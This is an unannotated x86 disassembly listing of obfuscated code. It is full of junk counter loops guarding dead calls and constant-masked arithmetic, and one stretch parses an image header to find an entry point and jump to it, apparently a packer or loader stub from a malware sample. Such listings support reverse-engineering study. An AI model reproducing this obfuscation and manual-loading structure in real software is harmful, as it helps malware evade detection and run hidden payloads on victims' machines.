  4239e9:	call   DWORD PTR ds:0x4257d4
  4239ef:	cmp    DWORD PTR ds:0x426848,0x9
  4239f6:	jne    0x423a09
  4239fc:	mov    edx,DWORD PTR ds:0x426848
  423a02:	inc    edx
  423a03:	mov    DWORD PTR ds:0x426848,edx
  423a09:	cmp    DWORD PTR ds:0x426848,0x1e
  423a10:	jb     0x4239af
  423a16:	mov    DWORD PTR [esp+0x68],eax
  423a1a:	movzx  edx,WORD PTR ds:0x4267f8
  423a21:	sub    DWORD PTR ds:0x42680c,edx
  423a27:	mov    DWORD PTR [esp+0x6c],edi
  423a2b:	and    DWORD PTR ds:0x426828,ecx
  423a31:	mov    DWORD PTR [esp+0x68],eax
  423a35:	mov    DWORD PTR [esp+0x6c],edi
  423a39:	mov    DWORD PTR [esp+0x68],eax
  423a3d:	mov    DWORD PTR [esp+0x6c],edi
  423a41:	mov    DWORD PTR ds:0x42683c,0x16
  423a4b:	cmp    DWORD PTR ds:0x42683c,0x0
  423a52:	je     0x423a9e
  423a58:	cmp    DWORD PTR ds:0x42683c,0x1e
  423a5f:	jge    0x423a9e
  423a65:	jmp    0x423a8c
  423a6a:	push   0x426830
  423a6f:	push   0x4720
  423a74:	push   0x72b9
  423a79:	push   0x36e8
  423a7e:	push   DWORD PTR [ebp-0x20]
  423a81:	push   0x7686
  423a86:	call   DWORD PTR ds:0x4257d8
  423a8c:	mov    edx,DWORD PTR ds:0x42683c
  423a92:	dec    edx
  423a93:	mov    DWORD PTR ds:0x42683c,edx
  423a99:	jmp    0x423a4b
  423a9e:	mov    DWORD PTR [esp+0x58],0xce941f82
  423aa6:	xor    edx,edx
  423aa8:	or     edx,DWORD PTR ds:0x4267d0
  423aae:	and    edx,DWORD PTR ds:0x426830
  423ab4:	mov    DWORD PTR ds:0x4267d0,edx
  423aba:	mov    DWORD PTR [esp+0x5c],edi
  423abe:	mov    edx,DWORD PTR ds:0x4267d4
  423ac4:	and    DWORD PTR ds:0x426844,edx
  423aca:	mov    DWORD PTR [esp+0x60],eax
  423ace:	or     DWORD PTR ds:0x4267e0,0x42684c
  423ad8:	mov    DWORD PTR [esp+0x64],edi
  423adc:	mov    DWORD PTR [esp+0x68],0xce941f9a
  423ae4:	mov    DWORD PTR [esp+0x6c],edi
  423ae8:	mov    eax,DWORD PTR [esp+0x50]
  423aec:	add    DWORD PTR ds:0x4267c0,0x7dfe
  423af6:	mov    edx,DWORD PTR [esp+0x54]
  423afa:	xor    eax,esi
  423afc:	add    eax,ecx
  423afe:	jmp    0x423bd1
  423b03:	dec    ecx
  423b04:	mov    eax,DWORD PTR [esp+0x48]
  423b08:	mov    ecx,DWORD PTR [esp+0x4c]
  423b0c:	or     DWORD PTR ds:0x4267f4,edx
  423b12:	mov    ecx,DWORD PTR [esp+0x10]
  423b16:	xor    eax,esi
  423b18:	lea    eax,[eax+ecx*1+0x56424137]
  423b1f:	mov    ecx,DWORD PTR ds:0x426818
  423b25:	adc    ecx,DWORD PTR ds:0x426824
  423b2b:	mov    DWORD PTR ds:0x426818,ecx
  423b31:	push   eax
  423b32:	mov    eax,DWORD PTR [esp+0x5c]
  423b36:	add    ecx,DWORD PTR ds:0x426844
  423b3c:	mov    ecx,DWORD PTR [esp+0x60]
  423b40:	xor    eax,esi
  423b42:	sbb    DWORD PTR ds:0x4267e0,0x4267d4
  423b4c:	lea    eax,[ebp+eax*1+0x5642413f]
  423b53:	push   eax
  423b54:	sbb    DWORD PTR ds:0x4267e0,edx
  423b5a:	mov    eax,ds:0x426448
  423b5f:	sbb    DWORD PTR ds:0x426828,0x2464
  423b69:	push   DWORD PTR [eax+0x1bc]
  423b6f:	call   0x407ec0
  423b74:	or     eax,ecx
  423b76:	mov    eax,DWORD PTR [esp+0x48]
  423b7a:	mov    ecx,DWORD PTR [esp+0x4c]
  423b7e:	and    DWORD PTR ds:0x4267e8,0x0
  423b88:	mov    ecx,DWORD PTR ds:0x4267e8
  423b8e:	inc    ecx
  423b8f:	mov    DWORD PTR ds:0x4267e8,ecx
  423b95:	cmp    DWORD PTR ds:0x4267e8,0x28
  423b9c:	jg     0x423bc4
  423ba2:	jmp    0x423bb7
  423ba7:	push   0x426818
  423bac:	push   0x2546
  423bb1:	call   DWORD PTR ds:0x4257e0
  423bb7:	cmp    DWORD PTR ds:0x4267e8,0x19
  423bbe:	jb     0x423b88
  423bc4:	mov    ecx,DWORD PTR [esp+0x10]
  423bc8:	xor    eax,esi
  423bca:	lea    eax,[ecx+eax*1+0x56424137]
  423bd1:	mov    DWORD PTR [esp+0x10],eax
  423bd5:	or     eax,ecx
  423bd7:	mov    eax,DWORD PTR [esp+0x48]
  423bdb:	and    edx,ecx
  423bdd:	mov    ecx,DWORD PTR [esp+0x4c]
  423be1:	or     DWORD PTR ds:0x426820,ecx
  423be7:	mov    ecx,DWORD PTR [esp+0x48]
  423beb:	mov    edx,DWORD PTR [esp+0x4c]
  423bef:	mov    DWORD PTR ds:0x42684c,0x785d
  423bf9:	xor    ecx,esi
  423bfb:	xor    eax,esi
  423bfd:	add    eax,ecx
  423bff:	xor    edx,edx
  423c01:	or     edx,DWORD PTR ds:0x4268c8
  423c07:	mov    edx,DWORD PTR [edx]
  423c09:	add    DWORD PTR ds:0x4267f4,edx
  423c0f:	mov    ecx,DWORD PTR [esp+0x48]
  423c13:	add    DWORD PTR ds:0x4267e4,edi
  423c19:	mov    edx,DWORD PTR [esp+0x4c]
  423c1d:	sbb    DWORD PTR ds:0x4267fc,0x67ba
  423c27:	xor    ecx,esi
  423c29:	lea    eax,[eax+ecx*1+0x2c6c3a5]
  423c30:	mov    DWORD PTR ds:0x426818,0x896
  423c3a:	cmp    DWORD PTR [esp+0x10],eax
  423c3e:	jbe    0x423b03
  423c44:	sbb    DWORD PTR ds:0x426830,ebx
  423c4a:	mov    eax,DWORD PTR [esp+0x50]
  423c4e:	mov    ecx,DWORD PTR [esp+0x54]
  423c52:	xor    eax,esi
  423c54:	sub    DWORD PTR ds:0x426844,0x3ab0
  423c5e:	add    eax,0x56424137
  423c63:	jmp    0x423cb5
  423c68:	mov    eax,DWORD PTR [esp+0x48]
  423c6c:	mov    ecx,DWORD PTR [esp+0x4c]
  423c70:	mov    ecx,DWORD PTR [esp+0x10]
  423c74:	xor    eax,esi
  423c76:	lea    eax,[eax+ecx*1+0x56424137]
  423c7d:	push   eax
  423c7e:	mov    eax,DWORD PTR [esp+0x64]
  423c82:	mov    ecx,DWORD PTR [esp+0x68]
  423c86:	xor    eax,esi
  423c88:	lea    eax,[ebp+eax*1+0x5642413f]
  423c8f:	push   eax
  423c90:	mov    eax,ds:0x426448
  423c95:	push   DWORD PTR [eax+0x1c0]
  423c9b:	call   0x407ec0
  423ca0:	mov    eax,DWORD PTR [esp+0x48]
  423ca4:	mov    ecx,DWORD PTR [esp+0x4c]
  423ca8:	mov    ecx,DWORD PTR [esp+0x10]
  423cac:	xor    eax,esi
  423cae:	lea    eax,[ecx+eax*1+0x56424137]
  423cb5:	mov    DWORD PTR [esp+0x10],eax
  423cb9:	mov    eax,DWORD PTR [esp+0x48]
  423cbd:	mov    ecx,DWORD PTR [esp+0x4c]
  423cc1:	mov    ecx,DWORD PTR [esp+0x48]
  423cc5:	mov    edx,DWORD PTR [esp+0x4c]
  423cc9:	xor    ecx,esi
  423ccb:	xor    eax,esi
  423ccd:	add    eax,ecx
  423ccf:	mov    ecx,DWORD PTR [esp+0x48]
  423cd3:	mov    edx,DWORD PTR [esp+0x4c]
  423cd7:	xor    ecx,esi
  423cd9:	lea    eax,[eax+ecx*1+0x2c6c3a5]
  423ce0:	cmp    DWORD PTR [esp+0x10],eax
  423ce4:	jbe    0x423c68
  423cea:	mov    eax,DWORD PTR [esp+0x50]
  423cee:	mov    ecx,DWORD PTR [esp+0x54]
  423cf2:	xor    eax,esi
  423cf4:	add    eax,0x56424137
  423cf9:	jmp    0x423d4b
  423cfe:	mov    eax,DWORD PTR [esp+0x48]
  423d02:	mov    ecx,DWORD PTR [esp+0x4c]
  423d06:	mov    ecx,DWORD PTR [esp+0x10]
  423d0a:	xor    eax,esi
  423d0c:	lea    eax,[eax+ecx*1+0x56424137]
  423d13:	push   eax
  423d14:	mov    eax,DWORD PTR [esp+0x6c]
  423d18:	mov    ecx,DWORD PTR [esp+0x70]
  423d1c:	xor    eax,esi
  423d1e:	lea    eax,[ebp+eax*1+0x5642413f]
  423d25:	push   eax
  423d26:	mov    eax,ds:0x426448
  423d2b:	push   DWORD PTR [eax+0x1c4]
  423d31:	call   0x407ec0
  423d36:	mov    eax,DWORD PTR [esp+0x48]
  423d3a:	mov    ecx,DWORD PTR [esp+0x4c]
  423d3e:	mov    ecx,DWORD PTR [esp+0x10]
  423d42:	xor    eax,esi
  423d44:	lea    eax,[ecx+eax*1+0x56424137]
  423d4b:	mov    DWORD PTR [esp+0x10],eax
  423d4f:	mov    eax,DWORD PTR [esp+0x48]
  423d53:	mov    ecx,DWORD PTR [esp+0x4c]
  423d57:	mov    ecx,DWORD PTR [esp+0x48]
  423d5b:	mov    edx,DWORD PTR [esp+0x4c]
  423d5f:	xor    ecx,esi
  423d61:	xor    eax,esi
  423d63:	add    eax,ecx
  423d65:	mov    ecx,DWORD PTR [esp+0x48]
  423d69:	mov    edx,DWORD PTR [esp+0x4c]
  423d6d:	xor    ecx,esi
  423d6f:	lea    eax,[eax+ecx*1+0x2c6c3a5]
  423d76:	cmp    DWORD PTR [esp+0x10],eax
  423d7a:	jbe    0x423cfe
  423d80:	mov    eax,ds:0x4262cc
  423d85:	mov    edx,DWORD PTR [esp+0x24]
  423d89:	sub    eax,ebx
  423d8b:	mov    ecx,0x751018b5
  423d90:	xor    eax,ecx
  423d92:	mov    DWORD PTR [edx],eax
  423d94:	lea    eax,[esp+0x20]
  423d98:	mov    DWORD PTR [esp+0x34],eax
  423d9c:	lea    eax,[ebp+0x4]
  423d9f:	mov    DWORD PTR [esp+0x20],eax
  423da3:	mov    eax,DWORD PTR [esp+0x28]
  423da7:	xor    eax,ecx
  423da9:	add    eax,ebx
  423dab:	xor    edx,edx
  423dad:	add    eax,0xa9bdbec9
  423db2:	mov    ecx,0xffffa89a
  423db7:	adc    edx,ecx
  423db9:	mov    ebx,0x856a
  423dbe:	xor    eax,esi
  423dc0:	xor    edx,ebx
  423dc2:	cmp    eax,0xce941f81
  423dc7:	jne    0x423dd5
  423dcd:	cmp    edx,edi
  423dcf:	je     0x423e7d
  423dd5:	mov    eax,DWORD PTR [esp+0x2c]
  423dd9:	mov    edi,DWORD PTR [esp+0x50]
  423ddd:	cdq    
  423dde:	add    eax,0xa9bdbec9
  423de3:	adc    edx,ecx
  423de5:	mov    DWORD PTR [esp+0x68],edi
  423de9:	mov    edi,DWORD PTR [esp+0x54]
  423ded:	xor    eax,esi
  423def:	xor    edx,ebx
  423df1:	mov    DWORD PTR [esp+0x6c],edi
  423df5:	cmp    DWORD PTR [esp+0x68],eax
  423df9:	jne    0x423e07
  423dff:	cmp    edi,edx
  423e01:	je     0x423e7d
  423e07:	mov    eax,ds:0x426448
  423e0c:	mov    DWORD PTR [esp+0x14],eax
  423e10:	mov    eax,DWORD PTR [esp+0x14]
  423e14:	push   0x4
  423e16:	push   DWORD PTR [eax+0x194]
  423e1c:	lea    eax,[esp+0x20]
  423e20:	push   eax
  423e21:	call   0x407ec0
  423e26:	mov    eax,DWORD PTR [esp+0x14]
  423e2a:	mov    ecx,DWORD PTR [esp+0x14]
  423e2e:	mov    eax,DWORD PTR [eax+0x194]
  423e34:	mov    eax,DWORD PTR [eax]
  423e36:	mov    eax,DWORD PTR [eax+0x3c]
  423e39:	mov    ecx,DWORD PTR [ecx+0x194]
  423e3f:	mov    ecx,DWORD PTR [ecx]
  423e41:	lea    eax,[ecx+eax*1+0x28]
  423e45:	mov    eax,DWORD PTR [eax]
  423e47:	add    DWORD PTR [esp+0x18],eax
  423e4b:	push   DWORD PTR ds:0x426528
  423e51:	push   DWORD PTR ds:0x4262cc
  423e57:	mov    eax,ds:0x426448
  423e5c:	mov    eax,DWORD PTR [eax+0x194]
  423e62:	push   DWORD PTR [eax]
  423e64:	mov    eax,DWORD PTR [esp+0x24]
  423e68:	call   eax
  423e6a:	mov    ecx,DWORD PTR ds:0x426448
  423e70:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423e76:	mov    DWORD PTR [ecx],eax
  423e78:	jmp    0x423fa0
  423e7d:	mov    eax,DWORD PTR [esp+0x30]
  423e81:	xor    edx,edx
  423e83:	add    eax,0xa9bdbec9
  423e88:	adc    ecx,edx
  423e8a:	mov    edx,DWORD PTR [esp+0x50]
  423e8e:	mov    edi,DWORD PTR [esp+0x54]
  423e92:	xor    eax,esi
  423e94:	xor    ecx,ebx
  423e96:	cmp    edx,eax
  423e98:	jne    0x423f2e
  423e9e:	cmp    edi,ecx
  423ea0:	jne    0x423f2e
  423ea6:	mov    eax,DWORD PTR [esp+0x50]
  423eaa:	mov    ecx,DWORD PTR [esp+0x54]
  423eae:	mov    ecx,DWORD PTR ds:0x426448
  423eb4:	mov    ecx,DWORD PTR [ecx+0x198]
  423eba:	xor    eax,esi
  423ebc:	mov    edi,0x56424137
  423ec1:	add    eax,edi
  423ec3:	cmp    eax,DWORD PTR [ecx]
  423ec5:	jne    0x423ef2
  423ecb:	mov    eax,DWORD PTR [esp+0x50]
  423ecf:	mov    ecx,DWORD PTR [esp+0x54]
  423ed3:	xor    eax,esi
  423ed5:	add    eax,edi
  423ed7:	push   eax
  423ed8:	push   0xbd8d95bc
  423edd:	push   DWORD PTR [esp+0x54]
  423ee1:	push   DWORD PTR [esp+0x54]
  423ee5:	push   DWORD PTR [esp+0x64]
  423ee9:	push   DWORD PTR [esp+0x64]
  423eed:	call   0x41f3fa
  423ef2:	push   DWORD PTR [esp+0x4c]
  423ef6:	push   DWORD PTR [esp+0x4c]
  423efa:	push   DWORD PTR [esp+0x5c]
  423efe:	push   DWORD PTR [esp+0x5c]
  423f02:	call   0x423fc6
  423f07:	mov    eax,DWORD PTR [esp+0x50]
  423f0b:	mov    ecx,DWORD PTR [esp+0x54]
  423f0f:	xor    eax,esi
  423f11:	add    eax,edi
  423f13:	mov    ds:0x4264d4,eax
  423f18:	mov    eax,DWORD PTR [esp+0x50]
  423f1c:	mov    ecx,DWORD PTR [esp+0x54]
  423f20:	xor    eax,esi
  423f22:	add    eax,edi
  423f24:	mov    ds:0x4264cc,eax
  423f29:	jmp    0x423f33
  423f2e:	mov    edi,0x56424137
  423f33:	mov    eax,DWORD PTR [esp+0x50]
  423f37:	mov    ecx,DWORD PTR [esp+0x54]
  423f3b:	mov    edx,DWORD PTR [esp+0x20]
  423f3f:	xor    eax,esi
  423f41:	xor    ecx,ebx
  423f43:	add    eax,edi
  423f45:	adc    ecx,0x5765
  423f4b:	xor    esi,esi
  423f4d:	cmp    edx,eax
  423f4f:	jne    0x423f5d
  423f55:	cmp    esi,ecx
  423f57:	je     0x423fb7
  423f5d:	mov    DWORD PTR [esp+0x38],0xa4043c3b
  423f65:	mov    DWORD PTR [esp+0x3c],0xbc03fdce
  423f6d:	mov    DWORD PTR [esp+0x40],0xb9e2ec28
  423f75:	mov    DWORD PTR [esp+0x44],0x4b161ad8
  423f7d:	call   0x4185fe
  423f82:	mov    eax,DWORD PTR [esp+0x1c]
  423f86:	lea    eax,[esp+0x34]
  423f8a:	push   eax
  423f8b:	push   DWORD PTR [esp+0x50]
  423f8f:	push   DWORD PTR [esp+0x50]
  423f93:	push   DWORD PTR [esp+0x60]
  423f97:	push   DWORD PTR [esp+0x60]
  423f9b:	call   0x418372
  423fa0:	mov    eax,ds:0x426448
  423fa5:	push   0x4
  423fa7:	add    eax,0x1cc
  423fac:	push   eax
  423fad:	lea    eax,[esp+0x24]
  423fb1:	push   eax
  423fb2:	call   0x407ec0
  423fb7:	mov    eax,DWORD PTR [esp+0x1c]
  423fbb:	mov    eax,DWORD PTR [eax]
  423fbd:	pop    edi
  423fbe:	pop    esi
  423fbf:	pop    ebx
  423fc0:	mov    esp,ebp
  423fc2:	pop    ebp
  423fc3:	ret    0xc
  423fc6:	push   ebp
  423fc7:	mov    ebp,esp
  423fc9:	sub    esp,0xec
  423fcf:	mov    edx,DWORD PTR [ebp+0x8]
  423fd2:	sbb    DWORD PTR ds:0x4267c0,0x5f57
  423fdc:	mov    ecx,DWORD PTR [ebp+0xc]
  423fdf:	and    ecx,0x2e74
  423fe5:	mov    eax,0x6729a14b
  423fea:	mov    ecx,DWORD PTR ds:0x4267c8
  423ff0:	sbb    DWORD PTR ds:0x4267b4,ecx
  423ff6:	xor    edx,eax
  423ff8:	and    DWORD PTR ds:0x4267e8,0x0
  424002:	jmp    0x424014
  424007:	mov    ecx,DWORD PTR ds:0x4267e8
  42400d:	inc    ecx
  42400e:	mov    DWORD PTR ds:0x4267e8,ecx
  424014:	cmp    DWORD PTR ds:0x4267e8,0x15
  42401b:	jae    0x424060
  424021:	cmp    DWORD PTR ds:0x4267e8,0xd
  424028:	jle    0x424060
  42402e:	jmp    0x424041
  424033:	push   0x4267d0
  424038:	push   DWORD PTR [ebp-0x24]
  42403b:	call   DWORD PTR ds:0x4257e4
  424041:	cmp    DWORD PTR ds:0x4267e8,0xc
  424048:	jne    0x42405b
  42404e:	mov    ecx,DWORD PTR ds:0x4267e8
  424054:	inc    ecx
  424055:	mov    DWORD PTR ds:0x4267e8,ecx
  42405b:	jmp    0x424007
  424060:	add    edx,0x56424137
  424066:	mov    DWORD PTR [ebp-0x44],edx
  424069:	movzx  ecx,BYTE PTR ds:0x426804
  424070:	and    DWORD PTR ds:0x4267d4,ecx
  424076:	mov    ecx,DWORD PTR ds:0x4262c8
  42407c:	or     DWORD PTR ds:0x4267e4,0x426830
  424086:	mov    ecx,DWORD PTR [ecx]
  424088:	or     DWORD PTR ds:0x426800,0xbe3
  424092:	mov    DWORD PTR [ebp-0x18],ecx
  424095:	mov    DWORD PTR ds:0x426848,0x15
  42409f:	cmp    DWORD PTR ds:0x426848,0x0
  4240a6:	je     0x4240e6
  4240ac:	cmp    DWORD PTR ds:0x426848,0x1f
  4240b3:	jb     0x4240e6
  4240b9:	jmp    0x4240d4
  4240be:	push   0x42685c
  4240c3:	push   DWORD PTR [ebp-0x14]
  4240c6:	push   DWORD PTR [ebp-0x14]
  4240c9:	push   0x538c
  4240ce:	call   DWORD PTR ds:0x425780
  4240d4:	mov    ecx,DWORD PTR ds:0x426848
  4240da:	dec    ecx
  4240db:	mov    DWORD PTR ds:0x426848,ecx
  4240e1:	jmp    0x42409f
  4240e6:	mov    ecx,DWORD PTR ds:0x4264d8
  4240ec:	mov    ecx,DWORD PTR [ecx]
  4240ee:	adc    DWORD PTR ds:0x426800,0x426824
  4240f8:	mov    DWORD PTR [ebp-0x1c],ecx
  4240fb:	mov    DWORD PTR ds:0x42682c,0x1e
  424105:	cmp    DWORD PTR ds:0x42682c,0x0
  42410c:	je     0x424146
  424112:	cmp    DWORD PTR ds:0x42682c,0x26
  424119:	jbe    0x424146
  42411f:	jmp    0x424132
  424124:	push   DWORD PTR [ebp-0x24]
  424127:	push   0x426105
  42412c:	call   DWORD PTR ds:0x4257b0
  424132:	xor    ecx,ecx
  424134:	or     ecx,DWORD PTR ds:0x42682c
  42413a:	dec    ecx
  42413b:	mov    DWORD PTR ds:0x42682c,ecx
  424141:	jmp    0x424105
  424146:	mov    ecx,DWORD PTR [ebp-0x18]
  424149:	adc    DWORD PTR ds:0x4267f0,0x506f
  424153:	xor    edx,edx
  424155:	push   ebx
  424156:	and    DWORD PTR ds:0x426838,0x0
  424160:	mov    ebx,DWORD PTR ds:0x426838
  424166:	inc    ebx
  424167:	mov    DWORD PTR ds:0x426838,ebx
  42416d:	cmp    DWORD PTR ds:0x426838,0x8
  424174:	jb     0x4241b1
  42417a:	jmp    0x42418a
  42417f:	push   0x7e21
  424184:	call   DWORD PTR ds:0x4257b4
  42418a:	cmp    DWORD PTR ds:0x426838,0x7
  424191:	jne    0x4241a4
  424197:	mov    ebx,DWORD PTR ds:0x426838
  42419d:	inc    ebx
  42419e:	mov    DWORD PTR ds:0x426838,ebx
  4241a4:	cmp    DWORD PTR ds:0x426838,0x1d
  4241ab:	jb     0x424160
  4241b1:	mov    ebx,DWORD PTR [ebp+0x8]
  4241b4:	sub    DWORD PTR ds:0x4267e0,0x426838
  4241be:	add    ecx,0xa9bdbec9
  4241c4:	push   esi
  4241c5:	mov    esi,DWORD PTR [ebp+0xc]
  4241c8:	mov    DWORD PTR ds:0x4267f0,0x5f16
  4241d2:	adc    edx,0xffffa89a
  4241d8:	xor    ecx,eax
  4241da:	or     DWORD PTR ds:0x426838,0x4267b0
  4241e4:	xor    edx,0x856a
  4241ea:	mov    DWORD PTR ds:0x426814,0x7fc6
  4241f4:	push   edi
  4241f5:	mov    DWORD PTR [ebp-0x44],esi
  4241f8:	not    DWORD PTR ds:0x4267ec
  4241fe:	mov    DWORD PTR [ebp-0x28],0xbd8d95f0
  424205:	movzx  edi,WORD PTR ds:0x4267d0
  42420c:	mov    DWORD PTR [ebp-0x20],0xbd8d97b0
  424213:	mov    esi,0x751018b5
  424218:	mov    edi,0x376272fb
  42421d:	cmp    ecx,ebx
  42421f:	mov    DWORD PTR ds:0x4267f4,0x72d9
  424229:	jne    0x424238
  42422f:	cmp    edx,DWORD PTR [ebp-0x44]
  424232:	je     0x424678
  424238:	and    DWORD PTR ds:0x4267fc,0x0
  424242:	mov    ebx,DWORD PTR ds:0x4267fc
  424248:	inc    ebx
  424249:	mov    DWORD PTR ds:0x4267fc,ebx
  42424f:	cmp    DWORD PTR ds:0x4267fc,0x8
  424256:	jbe    0x42429b
  42425c:	jmp    0x424274
  424261:	push   DWORD PTR [ebp-0x24]
  424264:	push   0x818f
  424269:	push   0x87de
  42426e:	call   DWORD PTR ds:0x425784
  424274:	cmp    DWORD PTR ds:0x4267fc,0x7
  42427b:	jne    0x42428e
  424281:	mov    ebx,DWORD PTR ds:0x4267fc
  424287:	inc    ebx
  424288:	mov    DWORD PTR ds:0x4267fc,ebx
  42428e:	cmp    DWORD PTR ds:0x4267fc,0x17
  424295:	jb     0x424242
  42429b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42429e:	mov    ebx,DWORD PTR [ebp+0x8]
  4242a1:	and    DWORD PTR ds:0x4267f4,0x426800
  4242ab:	xor    edx,edx
  4242ad:	add    ecx,0xa9bdbec9
  4242b3:	not    DWORD PTR ds:0x426800
  4242b9:	adc    edx,0xffffa89a
  4242bf:	mov    DWORD PTR [ebp-0x48],ebx
  4242c2:	sbb    DWORD PTR ds:0x426858,0x1604
  4242cc:	mov    ebx,DWORD PTR [ebp+0xc]
  4242cf:	neg    DWORD PTR ds:0x426838
  4242d5:	xor    ecx,eax
  4242d7:	not    DWORD PTR ds:0x42680c
  4242dd:	xor    edx,0x856a
  4242e3:	mov    DWORD PTR ds:0x4267b0,0x70c
  4242ed:	mov    DWORD PTR [ebp-0x44],ebx
  4242f0:	cmp    ecx,DWORD PTR [ebp-0x48]
  4242f3:	mov    DWORD PTR ds:0x426854,0x14cb
  4242fd:	jne    0x42431f
  424303:	mov    DWORD PTR ds:0x426840,0x7cfd
  42430d:	cmp    edx,ebx
  42430f:	mov    DWORD PTR ds:0x426824,0x4ac1
  424319:	je     0x424678
  42431f:	mov    DWORD PTR ds:0x426824,0x13
  424329:	cmp    DWORD PTR ds:0x426824,0x0
  424330:	je     0x42437d
  424336:	cmp    DWORD PTR ds:0x426824,0x9
  42433d:	jb     0x42437d
  424343:	jmp    0x424351
  424348:	push   DWORD PTR [ebp-0x20]
  42434b:	call   DWORD PTR ds:0x4257b8
  424351:	cmp    DWORD PTR ds:0x426824,0xa
  424358:	jne    0x42436b
  42435e:	mov    edx,DWORD PTR ds:0x426824
  424364:	dec    edx
  424365:	mov    DWORD PTR ds:0x426824,edx
  42436b:	mov    edx,DWORD PTR ds:0x426824
  424371:	dec    edx
  424372:	mov    DWORD PTR ds:0x426824,edx
  424378:	jmp    0x424329
  42437d:	mov    ecx,DWORD PTR [ebp-0x20]
  424380:	xor    ecx,esi
  424382:	xor    edx,0x34f7
  424388:	add    ecx,edi
  42438a:	mov    DWORD PTR [ebp-0x44],ecx
  42438d:	mov    ecx,DWORD PTR ds:0x426448
  424393:	add    edx,DWORD PTR ds:0x426820
  424399:	mov    DWORD PTR [ebp-0x44],ecx
  42439c:	mov    ecx,DWORD PTR [ebp-0x18]
  42439f:	or     DWORD PTR ds:0x4267b8,0x2c68
  4243a9:	mov    DWORD PTR [ebp-0x14],ecx
  4243ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4243af:	mov    edx,DWORD PTR ds:0x4267d8
  4243b5:	add    DWORD PTR ds:0x4267b4,edx
  4243bb:	push   0x4
  4243bd:	mov    DWORD PTR ds:0x4267d8,0x19
  4243c7:	cmp    DWORD PTR ds:0x4267d8,0x0
  4243ce:	je     0x42441f
  4243d4:	cmp    DWORD PTR ds:0x4267d8,0x2
  4243db:	jl     0x42441f
  4243e1:	jmp    0x4243f1
  4243e6:	push   0x1b21
  4243eb:	call   DWORD PTR ds:0x425788
  4243f1:	cmp    DWORD PTR ds:0x4267d8,0x3
  4243f8:	jne    0x42440d
  4243fe:	xor    edx,edx
  424400:	or     edx,DWORD PTR ds:0x4267d8
  424406:	dec    edx
  424407:	mov    DWORD PTR ds:0x4267d8,edx
  42440d:	mov    edx,DWORD PTR ds:0x4267d8
  424413:	dec    edx
  424414:	mov    DWORD PTR ds:0x4267d8,edx
  42441a:	jmp    0x4243c7
  42441f:	pop    edx
  424420:	xor    DWORD PTR ds:0x42680c,0x426830
  42442a:	sub    edx,ecx
  42442c:	add    edx,DWORD PTR [ebp-0x1c]
  42442f:	movzx  ecx,BYTE PTR ds:0x4267b0
  424436:	xor    ecx,DWORD PTR ds:0x426858
  42443c:	mov    DWORD PTR ds:0x4267b0,ecx
  424442:	mov    DWORD PTR [ebp-0x18],edx
  424445:	add    ecx,0x436
  42444b:	mov    DWORD PTR [ebp-0xb0],0xbd8d95bc
  424455:	xor    DWORD PTR ds:0x426840,edi
  42445b:	mov    ecx,DWORD PTR [ebp-0x14]
  42445e:	mov    DWORD PTR [ebp-0xac],ecx
  424464:	add    DWORD PTR ds:0x426814,edx
  42446a:	mov    ecx,DWORD PTR [ebp-0x18]
  42446d:	and    DWORD PTR ds:0x42681c,0x0
  424477:	mov    edx,DWORD PTR ds:0x42681c
  42447d:	inc    edx
  42447e:	mov    DWORD PTR ds:0x42681c,edx
  424484:	cmp    DWORD PTR ds:0x42681c,0x7
  42448b:	jge    0x4244d5
  424491:	jmp    0x4244ae
  424496:	push   0x75d0
  42449b:	push   DWORD PTR [ebp-0x24]
  42449e:	push   0x5ff2
  4244a3:	push   0x2c81
  4244a8:	call   DWORD PTR ds:0x42578c
  4244ae:	cmp    DWORD PTR ds:0x42681c,0x6
  4244b5:	jne    0x4244c8
  4244bb:	mov    edx,DWORD PTR ds:0x42681c
  4244c1:	inc    edx
  4244c2:	mov    DWORD PTR ds:0x42681c,edx
  4244c8:	cmp    DWORD PTR ds:0x42681c,0x19
  4244cf:	jb     0x424477
  4244d5:	mov    DWORD PTR [ebp-0xa8],ecx
  4244db:	sbb    DWORD PTR ds:0x4267c0,ecx
  4244e1:	mov    ecx,DWORD PTR [ebp-0x28]
  4244e4:	xor    ecx,esi
  4244e6:	sbb    DWORD PTR ds:0x426808,ebx
  4244ec:	add    ecx,edi
  4244ee:	and    DWORD PTR ds:0x426858,0x0
  4244f8:	jmp    0x42450c
  4244fd:	xor    edx,edx
  4244ff:	add    edx,DWORD PTR ds:0x426858
  424505:	inc    edx
  424506:	mov    DWORD PTR ds:0x426858,edx
  42450c:	cmp    DWORD PTR ds:0x426858,0x19
  424513:	jae    0x424555
  424519:	cmp    DWORD PTR ds:0x426858,0x9
  424520:	jb     0x424555
  424526:	jmp    0x424536
  42452b:	push   0x426142
  424530:	call   DWORD PTR ds:0x4257bc
  424536:	cmp    DWORD PTR ds:0x426858,0x8
  42453d:	jne    0x424550
  424543:	mov    edx,DWORD PTR ds:0x426858
  424549:	inc    edx
  42454a:	mov    DWORD PTR ds:0x426858,edx
  424550:	jmp    0x4244fd
  424555:	mov    DWORD PTR [ebp-0xa4],ecx
  42455b:	mov    edx,DWORD PTR ds:0x4267d4
  424561:	add    DWORD PTR ds:0x4267fc,edx
  424567:	lea    ecx,[ebp-0x38]
  42456a:	add    DWORD PTR ds:0x426814,edi
  424570:	mov    DWORD PTR [ebp-0xa0],ecx
  424576:	mov    ecx,DWORD PTR [ebp-0xb0]
  42457c:	xor    DWORD PTR ds:0x4267ec,ecx
  424582:	xor    ecx,esi
  424584:	and    DWORD PTR ds:0x4267f8,0x0
  42458e:	jmp    0x4245a0
  424593:	mov    edx,DWORD PTR ds:0x4267f8
  424599:	inc    edx
  42459a:	mov    DWORD PTR ds:0x4267f8,edx
  4245a0:	cmp    DWORD PTR ds:0x4267f8,0x19
  4245a7:	jae    0x4245ec
  4245ad:	cmp    DWORD PTR ds:0x4267f8,0xd
  4245b4:	ja     0x4245ec
  4245ba:	jmp    0x4245cd
  4245bf:	push   DWORD PTR [ebp-0x18]
  4245c2:	push   0x4267d8
  4245c7:	call   DWORD PTR ds:0x4257c0
  4245cd:	cmp    DWORD PTR ds:0x4267f8,0xc
  4245d4:	jne    0x4245e7
  4245da:	mov    edx,DWORD PTR ds:0x4267f8
  4245e0:	inc    edx
  4245e1:	mov    DWORD PTR ds:0x4267f8,edx
  4245e7:	jmp    0x424593
  4245ec:	add    ecx,edi
  4245ee:	sbb    edx,DWORD PTR ds:0x4267f8
  4245f4:	mov    DWORD PTR [ebp-0xb0],ecx
